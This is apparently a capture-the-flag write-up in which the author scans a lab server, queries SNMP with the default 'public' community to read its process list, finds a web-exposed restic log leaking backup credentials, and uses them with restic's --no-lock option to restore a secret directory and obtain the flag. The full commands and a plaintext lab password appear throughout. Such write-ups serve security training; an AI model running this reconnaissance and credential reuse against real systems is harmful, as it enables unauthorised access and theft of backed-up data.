Security conerns: Admin Johnson
======================================

## Task

Hi, TCC-CSIRT analyst,

admin Johnson began testing backup procedures on server johnson-backup.cypherfix.tcc, but left the process incomplete due to other interesting tasks. Your task is to determine whether the current state is exploitable.

See you in the next incident!

## Solution

Start with nmap scan of the server:

```
# nmap -p- johnson-backup.cypherfix.tcc
Starting Nmap 7.94SVN ( https://nmap.org ) at 2024-10-29 10:55 EDT
Nmap scan report for johnson-backup.cypherfix.tcc (10.99.24.30)
Host is up (0.0071s latency).
Not shown: 65533 closed tcp ports (reset)
PORT    STATE SERVICE
80/tcp  open  http
199/tcp open  smux
```

On TCP 80 is running apache, seems default. Interesting is port 199. It's SNMP multiplexing. This protocol is pretty useless for server exploitation but on Linux this service is provided with Net-SNMP daemon. So, maybe SNMP daemon is running on the server. As SNMP (which stands for Security Not My Problem) is working on UDP protocol, it's not easy to tell if it's running on the server. Communications works that way that client send UDP request packet to server and server, if community (means password) is correct, responds. For many years, many devices uses for read only access community "public." So let's try it:

```
# nmap -p- johnson-backup.cypherfix.tcc
Starting Nmap 7.94SVN ( https://nmap.org ) at 2024-10-29 10:55 EDT
Nmap scan report for johnson-backup.cypherfix.tcc (10.99.24.30)
Host is up (0.0071s latency).
Not shown: 65533 closed tcp ports (reset)
PORT    STATE SERVICE
80/tcp  open  http
199/tcp open  smux

Nmap done: 1 IP address (1 host up) scanned in 9.83 seconds
                                                                                                                                                                
┌──(root㉿kali)-[/home/kali/Downloads]
└─# snmpwalk -v1 -cpublic johnson-backup.cypherfix.tcc .
iso.3.6.1.2.1.25.4.2.1.1.1 = INTEGER: 1
iso.3.6.1.2.1.25.4.2.1.1.7 = INTEGER: 7
iso.3.6.1.2.1.25.4.2.1.1.8 = INTEGER: 8
iso.3.6.1.2.1.25.4.2.1.1.9 = INTEGER: 9
iso.3.6.1.2.1.25.4.2.1.1.14 = INTEGER: 14
iso.3.6.1.2.1.25.4.2.1.1.18 = INTEGER: 18
iso.3.6.1.2.1.25.4.2.1.1.20 = INTEGER: 20
iso.3.6.1.2.1.25.4.2.1.1.28 = INTEGER: 28
iso.3.6.1.2.1.25.4.2.1.1.29 = INTEGER: 29
iso.3.6.1.2.1.25.4.2.1.1.30 = INTEGER: 30
iso.3.6.1.2.1.25.4.2.1.1.1334 = INTEGER: 1334
iso.3.6.1.2.1.25.4.2.1.1.2255 = INTEGER: 2255
iso.3.6.1.2.1.25.4.2.1.2.1 = STRING: "supervisord"
iso.3.6.1.2.1.25.4.2.1.2.7 = STRING: "apache2ctl"
iso.3.6.1.2.1.25.4.2.1.2.8 = STRING: "cron"
iso.3.6.1.2.1.25.4.2.1.2.9 = STRING: "snmpd"
iso.3.6.1.2.1.25.4.2.1.2.14 = STRING: "cron"
iso.3.6.1.2.1.25.4.2.1.2.18 = STRING: "sh"
iso.3.6.1.2.1.25.4.2.1.2.20 = STRING: "restic.sh"
iso.3.6.1.2.1.25.4.2.1.2.28 = STRING: "apache2"
iso.3.6.1.2.1.25.4.2.1.2.29 = STRING: "apache2"
iso.3.6.1.2.1.25.4.2.1.2.30 = STRING: "apache2"
iso.3.6.1.2.1.25.4.2.1.2.1334 = STRING: "apache2"
iso.3.6.1.2.1.25.4.2.1.2.2255 = STRING: "sleep"
iso.3.6.1.2.1.25.4.2.1.3.1 = OID: ccitt.0
iso.3.6.1.2.1.25.4.2.1.3.7 = OID: ccitt.0
iso.3.6.1.2.1.25.4.2.1.3.8 = OID: ccitt.0
iso.3.6.1.2.1.25.4.2.1.3.9 = OID: ccitt.0
iso.3.6.1.2.1.25.4.2.1.3.14 = OID: ccitt.0
iso.3.6.1.2.1.25.4.2.1.3.18 = OID: ccitt.0
iso.3.6.1.2.1.25.4.2.1.3.20 = OID: ccitt.0
iso.3.6.1.2.1.25.4.2.1.3.28 = OID: ccitt.0
iso.3.6.1.2.1.25.4.2.1.3.29 = OID: ccitt.0
iso.3.6.1.2.1.25.4.2.1.3.30 = OID: ccitt.0
iso.3.6.1.2.1.25.4.2.1.3.1334 = OID: ccitt.0
iso.3.6.1.2.1.25.4.2.1.3.2255 = OID: ccitt.0
iso.3.6.1.2.1.25.4.2.1.4.1 = STRING: "/usr/bin/python3"
iso.3.6.1.2.1.25.4.2.1.4.7 = STRING: "/bin/sh"
iso.3.6.1.2.1.25.4.2.1.4.8 = STRING: "/usr/sbin/cron"
iso.3.6.1.2.1.25.4.2.1.4.9 = STRING: "/usr/sbin/snmpd"
iso.3.6.1.2.1.25.4.2.1.4.14 = STRING: "/usr/sbin/CRON"
iso.3.6.1.2.1.25.4.2.1.4.18 = STRING: "/bin/sh"
iso.3.6.1.2.1.25.4.2.1.4.20 = STRING: "/bin/bash"
iso.3.6.1.2.1.25.4.2.1.4.28 = STRING: "/usr/sbin/apache2"
iso.3.6.1.2.1.25.4.2.1.4.29 = STRING: "/usr/sbin/apache2"
iso.3.6.1.2.1.25.4.2.1.4.30 = STRING: "/usr/sbin/apache2"
iso.3.6.1.2.1.25.4.2.1.4.1334 = STRING: "/usr/sbin/apache2"
iso.3.6.1.2.1.25.4.2.1.4.2255 = STRING: "sleep"
iso.3.6.1.2.1.25.4.2.1.5.1 = STRING: "/usr/bin/supervisord"
iso.3.6.1.2.1.25.4.2.1.5.7 = STRING: "/usr/sbin/apache2ctl -D FOREGROUND"
iso.3.6.1.2.1.25.4.2.1.5.8 = STRING: "-f"
iso.3.6.1.2.1.25.4.2.1.5.9 = STRING: "-f"
iso.3.6.1.2.1.25.4.2.1.5.14 = STRING: "-f"
iso.3.6.1.2.1.25.4.2.1.5.18 = STRING: "-c /etc/scripts/restic.sh >> /var/www/html/1790c4c2883ad30be0222a3a93004e66/restic.err.log 2>&1"
iso.3.6.1.2.1.25.4.2.1.5.20 = STRING: "/etc/scripts/restic.sh"
iso.3.6.1.2.1.25.4.2.1.5.28 = STRING: "-D FOREGROUND"
iso.3.6.1.2.1.25.4.2.1.5.29 = STRING: "-D FOREGROUND"
iso.3.6.1.2.1.25.4.2.1.5.30 = STRING: "-D FOREGROUND"
iso.3.6.1.2.1.25.4.2.1.5.1334 = STRING: "-D FOREGROUND"
iso.3.6.1.2.1.25.4.2.1.5.2255 = STRING: "86400"
iso.3.6.1.2.1.25.4.2.1.6.1 = INTEGER: 4
iso.3.6.1.2.1.25.4.2.1.6.7 = INTEGER: 4
iso.3.6.1.2.1.25.4.2.1.6.8 = INTEGER: 4
iso.3.6.1.2.1.25.4.2.1.6.9 = INTEGER: 4
iso.3.6.1.2.1.25.4.2.1.6.14 = INTEGER: 4
iso.3.6.1.2.1.25.4.2.1.6.18 = INTEGER: 4
iso.3.6.1.2.1.25.4.2.1.6.20 = INTEGER: 4
iso.3.6.1.2.1.25.4.2.1.6.28 = INTEGER: 4
iso.3.6.1.2.1.25.4.2.1.6.29 = INTEGER: 4
iso.3.6.1.2.1.25.4.2.1.6.30 = INTEGER: 4
iso.3.6.1.2.1.25.4.2.1.6.1334 = INTEGER: 4
iso.3.6.1.2.1.25.4.2.1.6.2255 = INTEGER: 4
iso.3.6.1.2.1.25.4.2.1.7.1 = INTEGER: 2
iso.3.6.1.2.1.25.4.2.1.7.7 = INTEGER: 2
iso.3.6.1.2.1.25.4.2.1.7.8 = INTEGER: 2
iso.3.6.1.2.1.25.4.2.1.7.9 = INTEGER: 1
iso.3.6.1.2.1.25.4.2.1.7.14 = INTEGER: 2
iso.3.6.1.2.1.25.4.2.1.7.18 = INTEGER: 2
iso.3.6.1.2.1.25.4.2.1.7.20 = INTEGER: 2
iso.3.6.1.2.1.25.4.2.1.7.28 = INTEGER: 2
iso.3.6.1.2.1.25.4.2.1.7.29 = INTEGER: 2
iso.3.6.1.2.1.25.4.2.1.7.30 = INTEGER: 2
iso.3.6.1.2.1.25.4.2.1.7.1334 = INTEGER: 2
iso.3.6.1.2.1.25.4.2.1.7.2255 = INTEGER: 2
End of MIB
```

Yep, it's working. If we look in the results, we can see running process list. Interesting thing is shell script restic.sh, which logs output to /var/www/html directory. Maybe we can access this log from the webserver: http://johnson-backup.cypherfix.tcc/1790c4c2883ad30be0222a3a93004e66/restic.err.log

In log we can see some internal server errors from restic server. But most importantly, on the first line we can see URL address with credentials of restic server :-) So, after install restic client we can try to access backups:

```
# restic -r rest:http://johnson:KGDkjgsdsdg883hhd@restic-server.cypherfix.tcc:8000/test snapshots
enter password for repository: 
repository 902ea39d opened (version 2, compression level auto)
Save(<lock/e8cd801d6d>) returned error, retrying after 1.340753165s: unexpected HTTP response (500): 500 Internal Server Error
Save(<lock/e8cd801d6d>) returned error, retrying after 2.907229765s: unexpected HTTP response (500): 500 Internal Server Error
Save(<lock/e8cd801d6d>) returned error, retrying after 2.93242947s: unexpected HTTP response (500): 500 Internal Server Error
```

Same error. Let's try it again with wireshark or tcpdump what it's happening... In dump we can see that communication starts OK but error is returned when client try to create lock. Not sure why as I didn't know that restic exists until now but my guess is that if it's running on read only filesystem, this can happen. Luckily restic has --no-lock option, so try it again:

```
# restic --no-lock -r rest:http://johnson:KGDkjgsdsdg883hhd@restic-server.cypherfix.tcc:8000/test snapshots
enter password for repository: 
repository 902ea39d opened (version 2, compression level auto)
ID        Time                 Host          Tags        Paths
--------------------------------------------------------------------
8dfb6a02  2024-10-14 16:56:18  fcf671955256              /etc/secret
--------------------------------------------------------------------
1 snapshots
```

Seems good. So now I can try to restore /etc/secret directory from backup:

```
# restic --no-lock -r rest:http://johnson:KGDkjgsdsdg883hhd@restic-server.cypherfix.tcc:8000/test restore 8dfb6a02 --target .
enter password for repository: 
repository 902ea39d opened (version 2, compression level auto)
[0:00] 100.00%  1 / 1 index files loaded
restoring snapshot 8dfb6a02 of [/etc/secret] at 2024-10-14 20:56:18.631782921 +0000 UTC by root@fcf671955256 to .
Summary: Restored 3 files/dirs (26 B) in 0:00
```

And we have flag: FLAG{OItn-zKZW-cht7-RNH4}